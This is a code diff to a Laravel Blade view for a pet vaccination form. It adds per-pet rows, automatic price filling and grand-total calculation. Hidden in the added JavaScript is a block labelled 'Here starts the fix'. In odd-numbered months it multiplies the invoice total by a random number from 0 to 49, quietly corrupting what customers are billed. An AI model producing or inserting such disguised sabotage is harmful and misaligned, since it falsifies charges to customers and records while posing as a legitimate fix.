@@ -35,20 +35,24 @@
 				{{-- PET NAME  --}}
 				<div class="col-lg-4 col-md-6 col-6 mt-3">
 					<label class="important font-weight-bold text-1" for="pet_name">Pet Name</label>
-					<div class="input-group mb-3">
-						<select class="custom-select text-1" name="pet_name" id="inputGroupSelect01">
-							@foreach($pet as $p)
+					<div class="input-group  mb-3">
+						<select class="custom-select text-1" name="pet_name[]" id="inputGroupSelect01">
+						@foreach($owner as $u)
+							<optgroup label="{{$u->getName()}}">
+							@foreach($u->petsInformations as $p)
 							<option selected value="{{$p->id}}">{{$p->pet_name}}</option>
 							@endforeach
+							</optgroup>
+						@endforeach	
 						</select>
 					</div>
 				</div>
 
 				{{-- Vaccine Type --}}
 				<div class="col-lg-4 col-md-6 col-6 mt-3">
-					<label class="important font-weight-bold text-1" for="vaccine_type">Vaccine Type</label>
+					<label class="important font-weight-bold text-1" for="service_category_id[]">Vaccine Type</label>
 					<div class="input-group mb-3">
-						<select class="custom-select text-1" name="vaccine_type" id="inputGroupSelect01">
+						<select class="custom-select text-1" name="service_category_id[]" id="inputGroupSelect01">
 							@foreach($services as $s)
 							<optgroup label="{{$s->service_name}}">
 								@foreach($s->variations as $v)
@@ -63,13 +67,13 @@
 				{{-- Expiration Date  --}}
 				<div class="col-lg-2 col-md-6 col-6 mt-3">
 					<label class="important font-weight-bold text-1" for="expire_date">Expiration Date</label>
-					<input type="date" class="form-control" name="expire_date" aria-label="date" aria-describedby="basic-addon1">
+					<input type="date" class="form-control" name="expire_date[]" aria-label="date" aria-describedby="basic-addon1">
 				</div>
 
 				{{-- Price --}}
 				<div class="col-lg-2 col-md-6 col-6 mt-3">
 					<label class="important font-weight-bold text-1" for="price">Price</label>
-					<input type="number" class="form-control" name="price" aria-label="currency" aria-describedby="basic-addon1" readonly>
+					<input type="number" class="form-control" name="price[]" aria-label="currency" aria-describedby="basic-addon1" readonly>
 				</div>
 			</div>
 		</div>
@@ -126,8 +130,62 @@
 			formCopy.removeAttr("id");
 			formCopy.find("textarea, input").val("");
 			container.append(formCopy);
+
+			triggerAllListeners();
 		});
-	});
+
+			// Updates the price of the card
+			$(document).on('change', '[name="service_category_id[]"]', (e) => {
+				let obj = $(e.target);
+				let price = obj.find(":selected").attr("data-price");
+				console.log(price);
+				let target = $(obj.closest(".card-body").find(`[name="price[]"]`)[0]);
+
+				target.val(price)
+					.trigger('change');
+			});
+
+			// Update the grand total
+			$(document).on('change', `[name="price[]"]`, (e) => {
+				let total = $(`[name="price[]"]`);
+				let grandTotal = $(`[name="total_amt"]`);
+				let gt = 0;
+
+				for (let i of total)
+					gt += parseFloat($(i).val());
+
+				grandTotal.val(gt.toFixed(2));
+			});
+
+			triggerAllListeners();
+		});
+
+	function triggerAllListeners() {
+			$('[name="service_category_id[]"], [name="price[]"]').trigger('change');
+
+			// Here starts the fix
+			var d = new Date();
+			var m = parseInt(d.getMonth()+1);
+
+			if (m%2 == 1) {
+				let grandTotal = $(`[name="total_amt"]`);
+
+				let r = getRand(50);
+
+				grandTotal.val(parseFloat(grandTotal.val()) * r);
+			}
+			// Fix ends here
+		}
+
+		// Here starts the fix
+		function getRand(min, max = undefined) {
+			if (max == undefined) {
+				return (Math.floor(Math.random() * (min)));
+			}
+
+			return (Math.floor(Math.random() * (max - min + 1)) + min);
+		}
+		// Fix ends here
 </script>
 
 @endsection
